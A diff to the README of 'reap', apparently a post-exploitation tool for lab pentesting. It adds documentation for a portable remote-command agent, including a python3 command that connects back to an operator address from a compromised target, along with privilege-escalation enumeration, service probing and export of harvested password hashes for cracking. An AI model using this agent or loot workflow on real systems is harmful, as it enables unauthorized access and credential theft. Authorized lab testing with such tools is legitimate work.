@@ -52,6 +52,17 @@ cd ~/reap && bash install.sh --pipx --full    # global editable reap + all backe
 
 The optional backends are only used for credential *testing* against those services; reap collects loot without them. Run `./install.sh --help` for the full list.
 
+To update an existing Kali WSL checkout while retaining its loot databases:
+
+```bash
+cd ~/reap
+git pull --ff-only
+bash install.sh --pipx --full
+reap
+```
+
+For a local venv, use `bash install.sh --full` and activate `.venv` instead. `--full` chooses extras; `--pipx` supplies the global command.
+
 ## Quickstart
 
 ```
@@ -95,6 +106,7 @@ Pick the adapter that matches the access you already have:
 | Web / command-injection RCE | `register webshell <url> [--param NAME] [--method GET\|POST] [--shell sh\|cmd]` |
 | Raw reverse shell (nc-style) | `register listen <port>`, then fire your payload — reap catches it |
 | Raw bind shell | `register bind <host> <port>` |
+| Shell obtained through another tool | Prepare the portable agent, then use `register agent-listen ...` or `register agent ...` |
 
 ### Using a web shell (HTTP RCE)
 
@@ -169,6 +181,135 @@ reap> register bind 10.10.10.5 1337
 
 Windows `cmd.exe` reverse/bind shell: add `--shell cmd` (e.g. `register listen 4444 --shell cmd`).
 
+### Attaching a shell Reap cannot directly handle
+
+The portable agent attaches an existing lab foothold obtained through another tool. Transfer it using that shell, run it as the account you already have, and register its connection in Reap. You can then use `enum`, `ports`, `run`, `!ls` and `interact` through the normal session interface.
+
+The target needs **Python 3.9 or newer**. The standalone agent uses only Python's standard library; you do not install Reap or its dependencies on the target. It runs in the foreground, serves one authenticated session, installs no persistence, and exits when Reap closes the session or you stop it with Ctrl-C. Commands are line-based, without a PTY, and retain the existing account's privileges.
+
+Create a fresh kit on the operator:
+
+```text
+reap> agent prepare /tmp/reap-lab-kit
+```
+
+This creates `reap_agent.py`, `token.txt`, `fingerprint.txt`, `cert.pem` and `key.pem`. Each kit has a random token and its own TLS certificate. The directory must be new, so preparation cannot overwrite another lab's identity. Credential files use restrictive permissions on POSIX systems.
+
+**Connect back to Reap** when the target can reach your operator. Copy only `reap_agent.py`, `token.txt` and `fingerprint.txt` into a private directory on the target through your existing access. Keep the TLS private key on the operator for this mode.
+
+Start the Reap listener first:
+
+```text
+reap> register agent-listen 7443 --bundle /tmp/reap-lab-kit --bind 0.0.0.0
+```
+
+Then run this in the target shell, replacing `10.10.14.2` with the operator address reachable from that lab:
+
+```bash
+python3 /tmp/reap-agent/reap_agent.py --connect 10.10.14.2 --port 7443 \
+  --token-file /tmp/reap-agent/token.txt \
+  --fingerprint-file /tmp/reap-agent/fingerprint.txt
+```
+
+The agent verifies Reap's certificate against the supplied SHA-256 pin before sending its token. Reap verifies the token before registering the session, then fingerprints the target. A listener waits up to 60 seconds; if you miss the window, start it again.
+
+**Bind on the target** when your operator can reach the target directly. For this mode, also copy `cert.pem` and `key.pem` from the same kit into the private target directory:
+
+```bash
+python3 /tmp/reap-agent/reap_agent.py --bind 0.0.0.0 --port 7443 \
+  --token-file /tmp/reap-agent/token.txt \
+  --cert /tmp/reap-agent/cert.pem --key /tmp/reap-agent/key.pem
+```
+
+Connect from Reap while the agent is waiting:
+
+```text
+reap> register agent 10.10.10.5 7443 --bundle /tmp/reap-lab-kit
+reap> enum --save
+reap> ports --probe
+reap> !id
+reap> interact
+```
+
+In bind mode Reap verifies the agent certificate pin, and the agent verifies Reap's token. Use a specific interface or `127.0.0.1` instead of `0.0.0.0` if your existing tunnel reaches only that address. Both modes need a reachable TCP path and use TLS 1.2 or newer.
+
+Responses preserve stdout, stderr and exit codes. A timeout returns 124; reaching the 512 KiB limit per output stream returns 125 with an explicit partial-output diagnostic. Linux timeout cleanup terminates the command's process group. Windows execution uses `cmd`; timeout cleanup stops the direct command process, and descendant cleanup is limited. Requests are serialized so command responses cannot mix. A broken exchange closes the session rather than reusing an uncertain stream.
+
+Use `exit` to close Reap and the agent connection. Remove copied kit files from the target after use. The agent provides command execution; in-process forwarding still requires SSH. The existing explicit `forward` command can use its Chisel fallback where available.
+
+## Evidence, coverage and saved enumeration (v1.11)
+
+`enum` now shows confidence labels and check coverage. Connected execution leads show the command source, run-as account, owner, group, mode, effective access check and a suggested next check. Use `enum linked` to focus on this evidence.
+
+A file has one owner and one group. The useful intersection is a file owned by root whose group includes your user, or a root-owned file you can modify or replace. Ownership alone does not establish a privilege escalation path. The new `linked_evidence` module joins absolute paths from cron and service definitions to permissions checked as the session account. It checks whether a parent is writable, searchable and non-sticky, and accounts for immutable or append-only file attributes when available. Service accounts come from the effective systemd User property when available; otherwise the declaration is an inference.
+
+For example, a root cron referencing `/opt/backup.sh` can produce:
+
+```text
+E1
+/opt/backup.sh
+  /etc/cron.d/backup references this file as root; your session can modify the file
+  [confidence: observed]
+  Execution source: /etc/cron.d/backup
+  Run-as account: root
+  Command: * * * * * root /opt/backup.sh
+  Ownership/mode: root:developers 660
+  Session access check: can modify the file
+  Next check: Verify activation, mount options, ACLs and runtime use before concluding exploitability.
+```
+
+`observed` describes evidence returned by the target. `inferred` describes a heuristic or an account taken from a declaration rather than effective configuration. Neither label promises a working exploit. Version-based sudo leads ask you to check distro advisories and backported fixes. Custom files named `passwd` outside `/etc` are not classified as the system password database. SSH-key location hints use the target's HOME rather than the operator's.
+
+```text
+reap> enum                       # leads, full listings and check coverage
+reap> enum linked                # connected execution/permission leads
+reap> enum --brief               # hide raw listings; keep leads and coverage
+reap> show E1                    # full evidence from the latest enum
+reap> enum --save                # persist the complete returned survey
+reap> enum --diff                # compare with the latest saved baseline
+reap> enum --diff --save         # compare, then save the new baseline
+reap> show snapshot 1            # saved survey, including coverage
+reap> show 12                    # full evidence for stored finding 12
+```
+
+Ordinary `enum` remains screen-only. `--save` stores sections, leads, full returned lines and coverage separately from ranked findings. Snapshot IDs survive restarting Reap. `E1` identifiers refer to the latest enum in the current console. `run` persists actionable findings, collects credentials and runs correlation. Markdown reports retain full finding details; `findings` is a compact table and `show <id>` expands it. JSON exports include saved snapshots and coverage.
+
+`--diff` compares facts, leads and coverage with the latest saved snapshot for the same host and scope. A filter such as `cron` has its own baseline; `--probe` also creates a separate scope. `--brief` only changes presentation. `--diff` alone does not save. Changed process IDs, timestamps printed by tools and live socket changes can produce ordinary differences.
+
+The coverage table distinguishes completed checks, partial responses, missing tools, permission failures, timeouts and reached result caps. A completed bounded check describes its returned scope; it does not mean the whole host was examined. An empty response from a failed check is not evidence that nothing exists. Reap no longer calls the machine stock when no leads were returned.
+
+Filesystem checks use selected roots, caps and some depth limits. Set `REAP_ENUM_FULLFS=1` on the operator before starting Reap for a wider sweep; pseudo-filesystems remain pruned. Permission-escalation checks are skipped when the session already runs as root. Connected evidence checks at most 60 parsed absolute-path references. Shell expansions, relative paths, complex quoting and generated unit commands can require manual inspection.
+
+### Service identification on discovered ports
+
+```text
+reap> ports
+reap> ports --probe               # identify discovered TCP endpoints
+reap> enum --probe --save         # include identification in a saved survey
+reap> forward 127.0.0.1 3000       # IPv4 loopback web service
+reap> forward ::1 3000            # IPv6 loopback service
+```
+
+Socket rows preserve bind address, address family, transport, process and PID when exposed by the source. Two processes listening on different addresses at port 3000 remain separate. IPv6 `::1` stays IPv6. UDP sockets do not enter TCP credential checks or TCP auto-forwards, and loopback forwarding keeps each session and actual bind address separate.
+
+Without `--probe`, service names are guesses from a port or process. With `--probe`, Reap runs a small Python standard-library probe from the Linux target. It can return HTTP status, page title, Server header, redirect destination, banners, TLS protocol and certificate SHA-256 fingerprint. HTTP on an alternate port becomes an observed lead, helping distinguish an actual web service from a familiar port number.
+
+Identification selects at most 12 discovered TCP endpoints, reads at most 64 KiB per response and uses a 55-second overall budget with short connection/read timeouts. It tries plain TCP and TLS when needed. Redirects are recorded without following them; it does not scan additional ports or neighbouring hosts. TLS metadata is observational, including self-signed certificates, and does not verify service identity. Missing target Python, failed requests and caps appear in coverage. This optional feature currently requires Linux and target Python.
+
+### Password and hash exports
+
+```text
+reap> export creds lab
+reap> export hashes lab-hashes
+reap> export json lab-report.json
+```
+
+`export creds <prefix>` writes user, password and user/password lists. Usernames can come from any credential record; password lists contain only password credentials. Hashes, tokens, SSH keys and capabilities do not become password guesses. Multiline passwords cannot be represented in these line-based files and are excluded; JSON retains the original record.
+
+`export hashes` groups supported records into files such as `lab-hashes-m300.txt` and `lab-hashes-m12.txt`, plus `lab-hashes-manifest.json`. The manifest maps credential IDs and usernames to files, explains each format, and lists unsupported or malformed records with a reason. It does not run a cracker.
+
+Supported formats include MySQL native authentication, PostgreSQL MD5 and SCRAM, MongoDB SCRAM server keys, MSSQL 2005/2012 verifiers, explicitly identified NTLM, bcrypt and Unix MD5/SHA-256/SHA-512 crypt. MySQL's leading `*` is removed; PostgreSQL MD5 includes the username salt. MongoDB uses base64 usernames, star separators and **serverKey**, matching the [Hashcat format reference](https://hashcat.net/wiki/doku.php?id=example_hashes). Ambiguous bare MD5/NTLM digests, unsupported algorithms and old MongoDB stored-key records are listed as skipped rather than assigned a guessed mode. Recollect legacy Mongo records with this version.
+
 ## Looking around the box
 
 Once a session is registered you have two ways to work the host by hand, both from the reap prompt over the session you already hold: `enum` to survey it, and `!` / `interact` to run commands on it.
@@ -231,7 +372,7 @@ reap> enum proc        # just processes
 reap> enum system      # kernel, users, and the network sections (system_snapshot)
 ```
 
-**`enum` is screen-only — nothing it prints is written to the loot store**, so it never clutters `findings`. The point is to read the room. Looting the room is `run`'s job: the same collectors, run as part of `run`, quietly persist only the **actionable** subset as ranked findings —
+**Ordinary `enum` is screen-only; `enum --save` stores a separate snapshot.** It does not clutter ranked `findings`. The same collectors, run as part of `run`, persist the actionable subset as findings —
 
 - a secret on a process / cron / service command line → a **credential** (and it's fed straight into correlation);
 - a **writable** `systemd` unit file, a writable binary named in an `ExecStart=`, or a writable file a cron job executes → a **high** misconfig (classic privesc);
@@ -246,7 +387,7 @@ Unlike the opt-in LinPEAS/WinPEAS wrappers, `enum` needs **nothing on disk** —
 
 ### `ports` — every listening socket, reliably
 
-`ports` lists every local listener on the target. It unions **`ss`**, **`netstat`**, and **`/proc/net/{tcp,tcp6,udp,udp6}`** and dedupes — so a live service is found even on a stripped box where neither `ss` nor `netstat` is installed. That missing fallback is exactly why a running service on `:3000` could look like it didn't exist. `/proc/net` is always present on Linux, needs no root, and is the same table `ss` itself reads: if a socket is listening, this finds it.
+`ports` combines separate IPv4/IPv6 **`ss`** checks, **`netstat`**, and **`/proc/net/{tcp,tcp6,udp,udp6}`**. Procfs provides a fallback when socket tools are absent. It sees the session's network namespace; restricted procfs, containers, missing tools, permissions and short-lived listeners can limit results. Source status stays visible even when fallback discovery succeeds. A local listening socket also does not prove that a firewall permits access from the operator machine.
 
 ```
 reap> ports
@@ -299,8 +440,8 @@ It's **line-based, with no PTY**: send-a-command, read-the-output. Programs that
 | `sessions` / `use <id>` / `hosts` | list sessions / switch the active one / list discovered hosts |
 | `fingerprint [id]` | re-probe OS, privilege, runtimes |
 | `run [id]` | collect loot, then correlate |
-| `enum [filter]` | linpeas-style survey (processes/cron/services/network/kernel); screen-only |
-| `ports` | every local listening socket (ss + netstat + `/proc/net` union — found even with no ss/netstat); flags loopback-only |
+| `enum [filter] [--save] [--diff] [--probe] [--brief]` | survey, connected evidence, coverage and optional saved comparisons |
+| `ports [session] [--probe]` | distinct target socket binds, source coverage and optional service identification |
 | `!<cmd>` / `shell <cmd>` / `interact` | run commands on the target — one-off, or a line-based remote shell (`cd` persists) |
 | `correlate` | re-test credentials against services (incl. pass-the-hash); on a confirmed DB login, dump its credential catalog to loot |
 | `forward <rhost> <rport> [lport]` | tunnel a target-internal service to localhost over the SSH session |
@@ -309,7 +450,9 @@ It's **line-based, with no PTY**: send-a-command, read-the-output. Programs that
 | `findings` (alias `loot`) | ranked findings |
 | `search <regex>` / `note <id> <text>` | search findings / annotate one for the report |
 | `report [file] [redact]` | write findings and timeline to markdown (`redact` masks secrets) |
-| `export <creds\|targets\|json> [path]` | credential lists, target lists, or JSON |
+| `export <creds\|hashes\|targets\|json> [path]` | password lists, per-mode hashes, target lists, or JSON |
+| `show <id\|E1>` / `show snapshot <id>` | full finding, latest enum lead, or saved survey |
+| `agent prepare <new-directory>` | portable agent and TLS/token kit |
 | `import <nmap.xml>` | seed services from an nmap scan |
 | `modules` | which modules match the active context |
 
